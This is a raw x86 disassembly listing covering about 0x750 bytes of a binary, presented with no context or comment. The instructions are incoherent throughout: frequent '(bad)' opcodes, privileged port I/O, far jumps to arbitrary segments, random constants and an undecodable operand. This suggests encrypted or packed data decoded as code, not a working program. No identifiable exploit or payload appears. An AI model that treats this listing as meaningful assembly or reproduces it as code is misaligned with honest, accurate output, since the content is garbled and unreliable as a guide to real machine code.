  41b06e:	mov    bh,0x69
  41b070:	(bad)  
  41b071:	xor    eax,0x55244ec4
  41b076:	rcl    dh,1
  41b078:	mov    esi,0x63d0e834
  41b07d:	push   0x6ad68ab9
  41b082:	aaa    
  41b083:	xlat   BYTE PTR ds:[ebx]
  41b084:	leave  
  41b085:	mov    dh,0xff
  41b087:	jmp    0xec47:0xd088dd35
  41b08e:	jae    0x41b0a6
  41b090:	sbb    dl,cl
  41b092:	imul   eax,DWORD PTR [ebx+0x56],0x67d5365d
  41b099:	(bad)  
  41b09a:	cmp    al,0x4a
  41b09c:	mov    eax,0xcf51ffe0
  41b0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a2:	xor    edi,eax
  41b0a4:	sahf   
  41b0a5:	mov    ecx,0xe84b404d
  41b0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ab:	add    dh,BYTE PTR [edx+0x142a5b66]
  41b0b1:	fcomp  DWORD PTR [edi]
  41b0b3:	clc    
  41b0b4:	xor    ebp,DWORD PTR [esi]
  41b0b6:	js     0x41b121
  41b0b8:	push   ebx
  41b0b9:	push   0x25fe7876
  41b0be:	pop    ebx
  41b0bf:	ds in  al,dx
  41b0c1:	cmp    eax,0xfd7ed61c
  41b0c6:	adc    edx,esp
  41b0c8:	int    0x42
  41b0ca:	fild   WORD PTR [eax]
  41b0cc:	xlat   BYTE PTR ds:[ebx]
  41b0cd:	xchg   ebp,eax
  41b0ce:	shr    BYTE PTR [eax-0x1],cl
  41b0d1:	push   edx
  41b0d2:	pop    ds
  41b0d3:	cli    
  41b0d4:	gs cmp edx,edx
  41b0d7:	sti    
  41b0d8:	(bad)  
  41b0d9:	int3   
  41b0da:	ins    DWORD PTR es:[edi],dx
  41b0db:	and    DWORD PTR [edi+0x39],ebp
  41b0de:	mov    ebp,0x9d6a15
  41b0e3:	(bad)  
  41b0e4:	cmp    bl,BYTE PTR [esi+ebx*1+0x51]
  41b0e8:	sahf   
  41b0e9:	es idiv ecx
  41b0ec:	sub    edi,DWORD PTR [edx+0x1af72373]
  41b0f2:	ror    BYTE PTR [esi+0x2e046a79],0xbb
  41b0f9:	add    al,0xd6
  41b0fb:	int3   
  41b0fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0fd:	mov    esi,0x502d7236
  41b102:	div    BYTE PTR [eax-0x2]
  41b105:	sbb    DWORD PTR [ebx],edi
  41b107:	lods   eax,DWORD PTR ds:[esi]
  41b108:	lahf   
  41b109:	pop    esp
  41b10a:	sbb    eax,0xfefcd731
  41b10f:	and    edx,ebx
  41b111:	repnz push ss
  41b113:	jno    0x41b0d5
  41b115:	not    BYTE PTR [esp+edx*8-0x586e1d15]
  41b11c:	mov    ebp,0x1eb09a12
  41b121:	lods   al,BYTE PTR ds:[esi]
  41b122:	jmp    0x2215d12e
  41b127:	fadd   QWORD PTR ds:0x4d3ac85d
  41b12d:	cmp    ecx,0xffffff82
  41b130:	jmp    0xdbf9:0x41a98144
  41b137:	lods   al,BYTE PTR ds:[esi]
  41b138:	or     DWORD PTR [eax],esp
  41b13a:	mov    edx,0x34f601d0
  41b13f:	repz add esp,esi
  41b142:	sbb    al,0x9c
  41b144:	out    0x64,eax
  41b146:	gs (bad) 
  41b148:	jo     0x41b0da
  41b14a:	and    eax,edx
  41b14c:	cmp    al,0xb3
  41b14e:	push   ds
  41b14f:	xor    ah,dl
  41b151:	jno    0x41b1d1
  41b153:	cmp    BYTE PTR es:[ebp+0x7ff4fcb7],dh
  41b15a:	dec    ebp
  41b15b:	mov    edi,0x49ecb22
  41b160:	(bad)  
  41b161:	in     eax,0xad
  41b163:	and    dh,bl
  41b165:	or     ecx,DWORD PTR [esp+ebp*8+0x48]
  41b169:	test   al,0xd5
  41b16b:	inc    edi
  41b16c:	sub    DWORD PTR [edi],ebx
  41b16e:	cmp    DWORD PTR ds:0x2fedebf3,esi
  41b174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b175:	fimul  DWORD PTR [edi+edi*4-0x3973b4da]
  41b17c:	mov    ds:0xb8c66350,al
  41b181:	je     0x41b1d7
  41b183:	pop    ds
  41b184:	stos   DWORD PTR es:[edi],eax
  41b185:	dec    ebp
  41b186:	jge    0x41b155
  41b188:	stos   BYTE PTR es:[edi],al
  41b189:	jle    0x41b162
  41b18b:	ins    DWORD PTR es:[edi],dx
  41b18c:	cmp    ah,dh
  41b18e:	aaa    
  41b18f:	add    edx,ebp
  41b191:	dec    edi
  41b192:	pop    edi
  41b193:	mov    cl,0xa7
  41b195:	ins    BYTE PTR es:[edi],dx
  41b196:	out    dx,eax
  41b197:	pop    ss
  41b198:	call   DWORD PTR [ebp+0x39]
  41b19b:	sub    BYTE PTR [ebp-0x7a5e0551],0xb7
  41b1a2:	push   edx
  41b1a3:	push   0xfffffffa
  41b1a5:	pusha  
  41b1a6:	out    0xfe,al
  41b1a8:	popf   
  41b1a9:	shl    BYTE PTR [ebx],cl
  41b1ab:	xor    cl,bl
  41b1ad:	mov    BYTE PTR es:[esi+0x2bea3343],cl
  41b1b4:	push   esp
  41b1b5:	xor    esi,DWORD PTR [edi+0x22c9a07c]
  41b1bb:	add    ecx,DWORD PTR [ebx]
  41b1bd:	sub    eax,0xb6f4a395
  41b1c2:	sbb    ah,BYTE PTR [eax+eax*8]
  41b1c5:	jg     0x41b178
  41b1c7:	dec    esp
  41b1c8:	fwait
  41b1c9:	jae    0x41b238
  41b1cb:	pusha  
  41b1cc:	aad    0xb7
  41b1ce:	popf   
  41b1cf:	cli    
  41b1d0:	ror    esi,1
  41b1d2:	gs out 0x16,eax
  41b1d5:	pop    ebx
  41b1d6:	mov    BYTE PTR [edx+0x2723c18f],0xb5
  41b1dd:	jmp    FWORD PTR [edi-0x73f47f9d]
  41b1e3:	jg     0x41b20e
  41b1e5:	mov    eax,0xc9f68b15
  41b1ea:	jno    0x41b180
  41b1ec:	std    
  41b1ed:	mov    bl,0xf
  41b1ef:	push   ss
  41b1f0:	sub    cl,bl
  41b1f2:	and    dh,BYTE PTR [ebx]
  41b1f4:	popa   
  41b1f5:	mov    esi,0xce8fec83
  41b1fa:	push   eax
  41b1fb:	je     0x41b24f
  41b1fd:	stos   DWORD PTR es:[edi],eax
  41b1fe:	dec    ecx
  41b1ff:	ja     0x41b214
  41b201:	shr    BYTE PTR [ebx],0xbc
  41b204:	std    
  41b205:	les    esp,FWORD PTR [edi+ebx*4]
  41b208:	dec    edi
  41b209:	lock fucom st(1)
  41b20c:	into   
  41b20d:	xchg   DWORD PTR [ecx+0x18],ebp
  41b210:	push   ebx
  41b211:	lods   al,BYTE PTR ds:[esi]
  41b212:	jg     0x41b271
  41b214:	sub    cl,bh
  41b216:	ret    
  41b217:	dec    eax
  41b218:	cwde   
  41b219:	cmp    eax,0x3d05835a
  41b21e:	sbb    eax,0x2b1725ca
  41b223:	pop    es
  41b224:	mov    ecx,0xfc0d02e5
  41b229:	xor    ch,BYTE PTR ds:0x4df52871
  41b22f:	mov    ah,BYTE PTR [ecx+0x5239875b]
  41b235:	(bad)
  41b239:	mov    ebx,0xdf194152
  41b23e:	xchg   ebx,eax
  41b23f:	mov    al,ds:0x1a412a9
  41b244:	push   es
  41b245:	cdq    
  41b246:	int    0x2
  41b248:	aam    0x51
  41b24a:	loopne 0x41b299
  41b24c:	sbb    dl,BYTE PTR [edi-0x6ee7f1e4]
  41b252:	sub    al,0x79
  41b254:	fdivr  QWORD PTR [edi-0x62]
  41b257:	mov    dh,0xf6
  41b259:	rcl    BYTE PTR [ebp-0x3d],1
  41b25c:	adc    cl,dl
  41b25e:	push   eax
  41b25f:	sahf   
  41b260:	sbb    dl,dl
  41b262:	cmc    
  41b263:	popa   
  41b264:	mov    ebp,0x3247066a
  41b269:	pushf  
  41b26a:	lahf   
  41b26b:	mov    BYTE PTR [esi+0x28],ch
  41b26e:	jle    0x41b249
  41b270:	jle    0x41b232
  41b272:	adc    BYTE PTR [ecx+0x59078a8f],0xa3
  41b279:	xchg   edx,eax
  41b27a:	outs   dx,BYTE PTR ds:[esi]
  41b27b:	popf   
  41b27c:	add    BYTE PTR [edi+ebx*4+0x5f6492eb],bl
  41b283:	mov    cl,0x5e
  41b285:	in     eax,0x44
  41b287:	into   
  41b288:	sub    ch,BYTE PTR [eax]
  41b28a:	jo     0x41b295
  41b28c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b28d:	fwait
  41b28e:	pop    es
  41b28f:	mov    ds:0xfd43c63a,al
  41b294:	push   ecx
  41b295:	xlat   BYTE PTR ds:[ebx]
  41b296:	cmp    DWORD PTR [esi-0x31],ecx
  41b299:	xchg   BYTE PTR ds:[ebp+0x1444c21e],al
  41b2a0:	jnp    0x41b232
  41b2a2:	mov    eax,ds:0x739256ea
  41b2a7:	dec    ebp
  41b2a8:	add    al,0x5
  41b2aa:	push   ds
  41b2ab:	push   esp
  41b2ac:	dec    edx
  41b2ad:	test   al,0x98
  41b2af:	push   es
  41b2b0:	icebp  
  41b2b1:	pop    ecx
  41b2b2:	sti    
  41b2b3:	sub    al,0xfd
  41b2b5:	pextrw esp,(bad),0xc5
  41b2b7:	daa    
  41b2b8:	sti    
  41b2b9:	sbb    bl,cl
  41b2bb:	(bad)  
  41b2bc:	in     al,0x81
  41b2be:	add    al,0xaa
  41b2c0:	fwait
  41b2c1:	xchg   esp,eax
  41b2c2:	add    DWORD PTR [ecx-0x41],eax
  41b2c5:	xor    al,BYTE PTR [ecx+0x78]
  41b2c8:	push   0x608b975d
  41b2cd:	adc    bl,BYTE PTR [ebp+0x164a3d75]
  41b2d3:	call   0xa3702c1
  41b2d8:	dec    edx
  41b2d9:	pop    ebp
  41b2da:	or     dl,BYTE PTR [eax-0x7]
  41b2dd:	add    BYTE PTR [eax+0xc],dl
  41b2e0:	lea    esp,[esp+ebp*2]
  41b2e3:	nop
  41b2e4:	(bad)
  41b2e7:	mov    ebp,0x5bc5db72
  41b2ec:	into   
  41b2ed:	pmaddwd mm1,QWORD PTR [ecx+0x34f540e0]
  41b2f4:	sub    BYTE PTR [ecx],ch
  41b2f6:	add    al,0xd6
  41b2f8:	paddw  mm1,QWORD PTR ds:0x6ddabe5f
  41b2ff:	cli    
  41b300:	sbb    DWORD PTR [edx-0x74],eax
  41b303:	imul   esi,DWORD PTR [eax+0x77],0x5f
  41b307:	xchg   edx,eax
  41b308:	pop    DWORD PTR [ebp+0x110a4576]
  41b30e:	sub    dl,al
  41b310:	mov    dl,0x3e
  41b312:	in     eax,0xb8
  41b314:	mov    BYTE PTR [eax],dh
  41b316:	gs gs push 0xb79a559
  41b31d:	stc    
  41b31e:	fsub   st,st(1)
  41b320:	sti    
  41b321:	(bad)  
  41b322:	fidivr WORD PTR [edi-0x2d]
  41b325:	repnz cmc 
  41b327:	mov    bh,0x18
  41b329:	inc    edi
  41b32a:	fnsave [ebx-0x249a61fb]
  41b330:	pop    esp
  41b331:	or     cl,al
  41b333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b334:	cmp    BYTE PTR [edx],dh
  41b336:	test   eax,0xea610631
  41b33b:	cli    
  41b33c:	lods   eax,DWORD PTR ds:[esi]
  41b33d:	mov    cl,0xd8
  41b33f:	mov    bl,0x8c
  41b341:	sbb    al,0x93
  41b343:	push   edx
  41b344:	not    DWORD PTR [esi-0xbfbdcf3]
  41b34a:	ds test eax,0xef7c6842
  41b350:	hlt    
  41b351:	ins    DWORD PTR es:[edi],dx
  41b352:	push   0x54
  41b354:	gs stos BYTE PTR es:[edi],al
  41b356:	pop    esp
  41b357:	mov    edi,0x65cc4de1
  41b35c:	jg     0x41b37f
  41b35e:	out    0xc9,al
  41b360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b361:	mov    ch,BYTE PTR [edx+esi*1]
  41b364:	and    DWORD PTR [ecx],0x70629014
  41b36a:	or     edx,esp
  41b36c:	nop
  41b36d:	cs adc ah,al
  41b370:	mov    edx,0xdee0b84d
  41b375:	cld    
  41b376:	scas   al,BYTE PTR es:[edi]
  41b377:	das    
  41b378:	xchg   esp,eax
  41b379:	shr    DWORD PTR [esi-0x49],0xe7
  41b37d:	arpl   WORD PTR [esi-0x48259e7a],ax
  41b383:	(bad)  
  41b384:	in     al,dx
  41b385:	jne    0x41b383
  41b387:	fwait
  41b388:	loop   0x41b391
  41b38a:	int    0xc1
  41b38c:	ror    BYTE PTR [ebp+0x1d11f56d],cl
  41b392:	xchg   edx,eax
  41b393:	dec    eax
  41b394:	jge    0x41b3ec
  41b396:	fs into 
  41b398:	mov    dh,0x27
  41b39a:	or     BYTE PTR [edi+0x6e67b4c9],dh
  41b3a0:	and    esi,DWORD PTR [ebx]
  41b3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3a3:	ret    
  41b3a4:	push   ds
  41b3a5:	pop    es
  41b3a6:	jp     0x41b371
  41b3a8:	adc    ebx,DWORD PTR [ebx+ecx*2]
  41b3ab:	add    DWORD PTR [eax+0x18641953],ebp
  41b3b1:	jge    0x41b3cf
  41b3b3:	dec    eax
  41b3b4:	fcomp  DWORD PTR [eax]
  41b3b6:	shl    DWORD PTR [edx-0x124ef4e1],0xd
  41b3bd:	call   0x5807989d
  41b3c2:	loopne 0x41b3f5
  41b3c4:	std    
  41b3c5:	pushf  
  41b3c6:	sub    eax,ecx
  41b3c8:	dec    edx
  41b3c9:	pushf  
  41b3ca:	daa    
  41b3cb:	retf   
  41b3cc:	(bad)  
  41b3cd:	mov    eax,0x6129a808
  41b3d2:	add    bh,BYTE PTR [ecx-0x1e]
  41b3d5:	fisttp WORD PTR [eax-0xc7f0049]
  41b3db:	push   esi
  41b3dc:	sub    eax,0x64fb6ce3
  41b3e1:	mov    cl,0x4f
  41b3e3:	fistp  QWORD PTR [edx+0x10]
  41b3e6:	retf   
  41b3e7:	mov    ch,0x4b
  41b3e9:	or     BYTE PTR fs:[ebx+0x14175ecf],cl
  41b3f0:	pop    es
  41b3f1:	addr16 jg 0x41b411
  41b3f4:	shl    ecx,cl
  41b3f6:	gs inc esp
  41b3f8:	hlt    
  41b3f9:	int3   
  41b3fa:	push   eax
  41b3fb:	mov    esi,0x45bac5b7
  41b400:	mov    fs,edx
  41b402:	inc    ebp
  41b403:	xchg   edi,eax
  41b404:	pop    eax
  41b405:	xlat   BYTE PTR ds:[ebx]
  41b406:	jecxz  0x41b457
  41b408:	into   
  41b409:	sub    ecx,DWORD PTR [eax]
  41b40b:	jno    0x41b3b0
  41b40d:	add    al,0x1
  41b40f:	inc    eax
  41b410:	std    
  41b411:	rcr    BYTE PTR [eax+0x10],1
  41b414:	int3   
  41b415:	lock mov dl,0xab
  41b418:	jmp    0x37a0:0xa5b6bb3b
  41b41f:	je     0x41b3a2
  41b421:	jb     0x41b492
  41b423:	repz push ecx
  41b425:	arpl   WORD PTR [ebp-0x7073ba8e],cx
  41b42b:	xor    BYTE PTR [eax-0x3101424a],0x92
  41b432:	pop    ss
  41b433:	int3   
  41b434:	mov    edx,ebp
  41b436:	in     eax,0x81
  41b438:	pop    ds
  41b439:	mov    ds:0xe76c43f2,al
  41b43e:	test   eax,0x96e90aa8
  41b443:	and    DWORD PTR [esi],ebp
  41b445:	jle    0x41b46d
  41b447:	xchg   DWORD PTR [edx+esi*8],eax
  41b44a:	jno    0x41b495
  41b44c:	lock dec eax
  41b44e:	sub    BYTE PTR [esi],0xce
  41b451:	pop    ebp
  41b452:	test   BYTE PTR [ebx-0x7],bl
  41b455:	ret    0xa53c
  41b458:	ins    BYTE PTR es:[edi],dx
  41b459:	sahf   
  41b45a:	or     ch,dl
  41b45c:	add    BYTE PTR [eax-0x447fa99f],cl
  41b462:	inc    esp
  41b463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b464:	pcmpgtd mm0,QWORD PTR [ecx-0x1e]
  41b468:	hlt    
  41b469:	loop   0x41b432
  41b46b:	pop    ss
  41b46c:	fdivr  DWORD PTR [ebx+0x13774902]
  41b472:	data16 jo 0x41b400
  41b475:	mov    esp,0xf8ace47f
  41b47a:	popa   
  41b47b:	mov    bh,0x29
  41b47d:	bound  ebp,QWORD PTR [ecx+0x46f3d851]
  41b483:	dec    edx
  41b485:	cmc    
  41b486:	push   cs
  41b487:	loopne 0x41b41b
  41b489:	jge    0x41b40d
  41b48b:	int    0xb6
  41b48d:	xchg   esp,eax
  41b48e:	aaa    
  41b48f:	xchg   DWORD PTR [edx-0x70231de9],ecx
  41b495:	and    eax,edi
  41b497:	push   esi
  41b498:	imul   edi,ebp,0xfffffff6
  41b49b:	mov    ah,0x7a
  41b49d:	cmp    BYTE PTR [edx],al
  41b49f:	sub    edx,ebx
  41b4a1:	jg     0x41b49b
  41b4a3:	mov    cl,0x37
  41b4a5:	push   ebx
  41b4a6:	les    ebx,FWORD PTR [esp+eiz*4-0x7e]
  41b4aa:	mov    edi,0x309e3843
  41b4af:	(bad)  
  41b4b0:	int3   
  41b4b1:	ret    
  41b4b2:	loope  0x41b50a
  41b4b4:	add    bh,bh
  41b4b6:	lahf   
  41b4b7:	push   esp
  41b4b8:	cmp    DWORD PTR [ebx-0x4c20f48f],ebp
  41b4be:	sbb    esp,DWORD PTR [ebp+0x6c4c789e]
  41b4c4:	pushf  
  41b4c5:	nop
  41b4c6:	dec    eax
  41b4c7:	data16 hlt 
  41b4c9:	pop    ss
  41b4ca:	addr16 je 0x41b4cd
  41b4cd:	cmp    BYTE PTR [ebp+0x76],dl
  41b4d0:	test   BYTE PTR ds:0xa55bb664,dl
  41b4d6:	cmp    eax,DWORD PTR [edi-0x9]
  41b4d9:	mov    al,BYTE PTR [esi-0x9]
  41b4dc:	sub    eax,0xb15dc309
  41b4e1:	adc    DWORD PTR [edi-0x55],ebp
  41b4e4:	pop    ebx
  41b4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4e6:	mov    dl,0x2
  41b4e8:	fsubr  DWORD PTR [edi+0x7a]
  41b4eb:	mov    dl,0x70
  41b4ed:	cmp    ecx,ebp
  41b4ef:	(bad)  
  41b4f0:	cli    
  41b4f1:	push   ebx
  41b4f2:	xlat   BYTE PTR ds:[ebx]
  41b4f3:	lea    ebx,[edi+0x6f999ce9]
  41b4f9:	out    dx,eax
  41b4fa:	lds    eax,FWORD PTR [ebp+0x7872d610]
  41b500:	dec    ecx
  41b501:	lods   al,BYTE PTR ds:[esi]
  41b502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b503:	(bad)  
  41b504:	pop    ecx
  41b505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b506:	loope  0x41b523
  41b508:	dec    ecx
  41b509:	dec    edx
  41b50a:	cmp    ah,BYTE PTR [ebx]
  41b50c:	mov    ds:0xe973e807,eax
  41b511:	aas    
  41b512:	add    eax,0xe99d194b
  41b517:	inc    edx
  41b518:	mov    cl,0x2f
  41b51a:	ds mov dl,0x5f
  41b51d:	xchg   ecx,eax
  41b51e:	add    edx,esp
  41b520:	sbb    al,0xb9
  41b522:	jnp    0x41b51f
  41b524:	fucomi st,st(0)
  41b526:	jae    0x41b4da
  41b528:	push   es
  41b529:	call   0x7637:0x62b0a646
  41b530:	add    ecx,DWORD PTR [esi+0x2f]
  41b533:	mov    edx,0xee3406ed
  41b538:	(bad)  
  41b539:	push   ebx
  41b53a:	arpl   WORD PTR [eax],bp
  41b53c:	and    BYTE PTR [eax+0x32cafa3b],cl
  41b542:	pop    edi
  41b543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b544:	push   es
  41b545:	pop    ebp
  41b546:	in     al,0xcb
  41b548:	and    ecx,esp
  41b54a:	mov    eax,0x4c3683bb
  41b54f:	stos   BYTE PTR es:[edi],al
  41b550:	int    0x4f
  41b552:	jns    0x41b57d
  41b554:	xlat   BYTE PTR ds:[ebx]
  41b555:	arpl   si,ax
  41b557:	inc    esp
  41b558:	fstp   QWORD PTR [ecx]
  41b55a:	mov    eax,0xf7b9da5
  41b55f:	xchg   ebp,eax
  41b560:	inc    ebx
  41b561:	gs sbb dl,dl
  41b564:	ret    
  41b565:	jp     0x41b509
  41b567:	stc    
  41b568:	fild   WORD PTR [ecx]
  41b56a:	xchg   esi,eax
  41b56b:	dec    DWORD PTR [esi]
  41b56d:	not    ebp
  41b56f:	xchg   edx,eax
  41b570:	pop    esp
  41b571:	out    0xed,al
  41b573:	add    DWORD PTR [ebx+esi*8-0x7],edx
  41b577:	adc    BYTE PTR [esi-0x128bb4b1],0x8a
  41b57e:	and    DWORD PTR [edx-0x5e208b69],esp
  41b584:	retf   0xdc8f
  41b587:	ds daa 
  41b589:	rcl    DWORD PTR [ebx-0x4ef377b7],cl
  41b58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b590:	(bad)  
  41b591:	fnstenv [ebx]
  41b593:	sbb    DWORD PTR [ecx+0x5e967a3c],ebp
  41b599:	int    0x58
  41b59b:	xchg   ebx,eax
  41b59c:	pop    eax
  41b59d:	popf   
  41b59e:	sbb    ecx,DWORD PTR ss:[edi-0x63b8394c]
  41b5a5:	aad    0x65
  41b5a7:	mov    ebx,0xb60d0fda
  41b5ac:	mov    cl,BYTE PTR ds:0xc44846ad
  41b5b2:	push   ebp
  41b5b3:	xchg   al,bl
  41b5b5:	xchg   DWORD PTR [eax-0x15a0c833],esi
  41b5bb:	and    cl,bl
  41b5bd:	rcl    DWORD PTR [eax+0x73c4b4d6],0x37
  41b5c4:	xchg   edx,eax
  41b5c5:	adc    edx,esp
  41b5c7:	(bad)  
  41b5c8:	enter  0xf1e7,0x8c
  41b5cc:	mov    DWORD PTR [ebx],ecx
  41b5ce:	ins    DWORD PTR es:[edi],dx
  41b5cf:	jmp    0x767694ce
  41b5d4:	add    DWORD PTR [eax],eax
  41b5d6:	xor    bl,BYTE PTR [ebx+0x22]
  41b5d9:	add    al,0x3c
  41b5db:	adc    eax,0x229e7f82
  41b5e0:	or     ch,BYTE PTR [ebx+0x6e]
  41b5e3:	ror    esp,0xb8
  41b5e6:	adc    eax,0x5413e5e6
  41b5eb:	popf   
  41b5ec:	pop    ebx
  41b5ed:	cmp    al,0x3f
  41b5ef:	test   al,0x33
  41b5f1:	and    BYTE PTR [edx+0x3c],bh
  41b5f4:	ror    BYTE PTR [esi+0x309ff142],1
  41b5fa:	push   ecx
  41b5fb:	lods   eax,DWORD PTR ds:[esi]
  41b5fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5fd:	pop    eax
  41b5fe:	xor    DWORD PTR [ebx-0x7],0x15
  41b602:	aam    0x82
  41b604:	adc    DWORD PTR [esi],0xe527e927
  41b60a:	scas   al,BYTE PTR es:[edi]
  41b60b:	push   edx
  41b60c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b60d:	jecxz  0x41b595
  41b60f:	js     0x41b61b
  41b611:	or     DWORD PTR [ebp-0x913704e],0xd065bcdd
  41b61b:	cld    
  41b61c:	in     eax,dx
  41b61d:	pop    ebp
  41b61e:	repz les ebx,FWORD PTR gs:[ecx]
  41b622:	jbe    0x41b69d
  41b624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b625:	jecxz  0x41b613
  41b627:	or     ebp,edi
  41b629:	jo     0x41b5fa
  41b62b:	inc    eax
  41b62c:	pop    ds
  41b62d:	pop    ecx
  41b62e:	mov    bh,BYTE PTR ds:0x2f10509c
  41b634:	mov    eax,0x6b960176
  41b639:	add    al,0xe8
  41b63b:	das    
  41b63c:	shl    BYTE PTR [esi+0xe],cl
  41b63f:	mov    ds:0x6f14d53d,al
  41b644:	pop    ebp
  41b645:	dec    ebx
  41b646:	xor    ebp,DWORD PTR [esi+0x25427d99]
  41b64c:	cmp    esi,esi
  41b64e:	push   esi
  41b64f:	stos   BYTE PTR es:[edi],al
  41b650:	jmp    0x1a25:0x6a6eeac6
  41b657:	inc    edx
  41b658:	dec    ebp
  41b659:	retf   
  41b65a:	xor    eax,0x19a0ff28
  41b65f:	jmp    0xac46:0x5f57b3a2
  41b666:	out    dx,eax
  41b667:	push   ebp
  41b668:	dec    BYTE PTR ds:0xbaa5c9e9
  41b66e:	in     al,dx
  41b66f:	adc    bh,bl
  41b671:	mov    cl,0x75
  41b673:	fimul  DWORD PTR [edi+0x606d5792]
  41b679:	inc    esp
  41b67a:	sub    DWORD PTR [edx],0x28b4180a
  41b680:	dec    ecx
  41b681:	std    
  41b682:	dec    ebx
  41b683:	mov    BYTE PTR [ecx],al
  41b685:	mov    DWORD PTR [esi+ebp*4+0x25c5d4f4],ebx
  41b68c:	sbb    DWORD PTR [ebx],eax
  41b68e:	or     esp,edi
  41b690:	sbb    dh,ch
  41b692:	popf   
  41b693:	cmp    BYTE PTR [eax-0x38],0xeb
  41b697:	(bad)  
  41b698:	push   ebp
  41b699:	xchg   edx,eax
  41b69a:	stos   BYTE PTR es:[edi],al
  41b69b:	add    eax,0x67ffb096
  41b6a0:	outs   dx,BYTE PTR ds:[esi]
  41b6a1:	(bad)  
  41b6a2:	cmp    edx,DWORD PTR [ebp+0x393f24ec]
  41b6a8:	or     al,0xae
  41b6aa:	xchg   ebx,eax
  41b6ab:	cmp    ecx,DWORD PTR ds:0xdc0acf58
  41b6b1:	ficom  DWORD PTR [eax]
  41b6b3:	loopne 0x41b64d
  41b6b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b6:	aas    
  41b6b7:	rcl    BYTE PTR [ebp+ecx*8-0x47e185c3],cl
  41b6be:	pushf  
  41b6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6c0:	xchg   edx,eax
  41b6c1:	imul   ebp,ebp,0x75
  41b6c4:	xor    DWORD PTR [ecx+0x57],edi
  41b6c7:	test   eax,0x27505a66
  41b6cc:	mov    BYTE PTR [esi],bl
  41b6ce:	sub    eax,0x71d61d68
  41b6d3:	int3   
  41b6d4:	dec    esp
  41b6d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6d6:	xor    BYTE PTR [ecx-0xa4513ee],bh
  41b6dc:	ins    DWORD PTR es:[edi],dx
  41b6dd:	dec    ecx
  41b6de:	xchg   DWORD PTR [esi+0x22c87510],edi
  41b6e4:	dec    esp
  41b6e5:	or     BYTE PTR [esi+0x11ad83e6],cl
  41b6eb:	ret    0x2386
  41b6ee:	in     eax,0xbe
  41b6f0:	fisub  DWORD PTR [edx-0xeff596c]
  41b6f6:	in     eax,0x46
  41b6f8:	xchg   esi,eax
  41b6f9:	adc    esp,0x3a
  41b6fc:	(bad)  
  41b6fd:	idiv   BYTE PTR [edi]
  41b6ff:	dec    eax
  41b700:	pushf  
  41b701:	xchg   dh,ah
  41b703:	push   esp
  41b704:	and    edi,0x7e
  41b707:	adc    DWORD PTR [esi-0x7834e2b5],0xa73e9b07
  41b711:	cmp    DWORD PTR [ebx+0x21],eax
  41b714:	mov    eax,ds:0x90b66db
  41b719:	pop    ss
  41b71a:	xor    ch,BYTE PTR [ecx]
  41b71c:	xchg   edx,eax
  41b71d:	mov    bh,0xbb
  41b71f:	push   edx
  41b720:	push   edx
  41b721:	mov    ds:0xf237205e,eax
  41b726:	loopne 0x41b6c1
  41b728:	js     0x41b6e5
  41b72a:	out    dx,al
  41b72b:	lahf   
  41b72c:	and    al,0x4e
  41b72e:	mov    eax,0x43ef7da2
  41b733:	cwde   
  41b734:	push   ss
  41b735:	cs add eax,0x4b13d0b5
  41b73b:	adc    DWORD PTR [eax+0x2e],eax
  41b73e:	jmp    0x9cfd:0x34e51179
  41b745:	(bad)  
  41b748:	inc    ebp
  41b749:	and    BYTE PTR gs:[ebx+0x77],dh
  41b74d:	inc    esp
  41b74e:	fidiv  DWORD PTR [edi-0x1b]
  41b751:	dec    esp
  41b752:	mov    bl,BYTE PTR [edx+0x3a04b5dc]
  41b758:	xor    ch,BYTE PTR [ebx+0x36]
  41b75b:	dec    DWORD PTR [esi]
  41b75d:	in     eax,dx
  41b75e:	sbb    DWORD PTR [esi-0x2],esp
  41b761:	nop
  41b762:	test   al,0x7a
  41b764:	cmc    
  41b765:	push   0xffffffae
  41b767:	dec    esi
  41b768:	add    DWORD PTR [ebp-0x6f],ebx
  41b76b:	sti    
  41b76c:	div    DWORD PTR [esi]
  41b76e:	arpl   WORD PTR [ecx-0x7e],cx
  41b771:	mov    ?,WORD PTR ds:0xa80a8d75
  41b777:	cmp    eax,0x253d974d
  41b77c:	mov    ds:0x8c708db0,eax
  41b781:	dec    ebx
  41b782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b783:	out    0xe9,eax
  41b785:	push   ds
  41b786:	ja     0x41b71f
  41b788:	cwde   
  41b789:	add    cl,dl
  41b78b:	in     eax,0x50
  41b78d:	cmp    BYTE PTR [eax+ecx*4-0x19],ch
  41b791:	jge    0x41b758
  41b793:	mov    ecx,0x35e5a9db
  41b798:	push   ss
  41b799:	sbb    DWORD PTR [eax],0x1c
  41b79c:	and    al,0xfa
  41b79e:	cmp    cl,BYTE PTR [edx+edx*2]
  41b7a1:	sub    esi,edx
  41b7a3:	mov    dh,0xdb
  41b7a5:	pop    eax
  41b7a6:	push   ebp
  41b7a7:	jb     0x41b738
  41b7a9:	les    bx,DWORD PTR [edi]
  41b7ac:	cdq    
  41b7ad:	iret   
  41b7ae:	loope  0x41b76c
  41b7b0:	fdivr  DWORD PTR [ecx]
  41b7b2:	mov    eax,ds:0xec3c8b77
  41b7b7:	imul   ebx,DWORD PTR [esi-0x69],0x4f
  41b7bb:	repz inc eax
  41b7bd:	dec    edx
  41b7be:	fdivr  QWORD PTR [ebp-0x11]
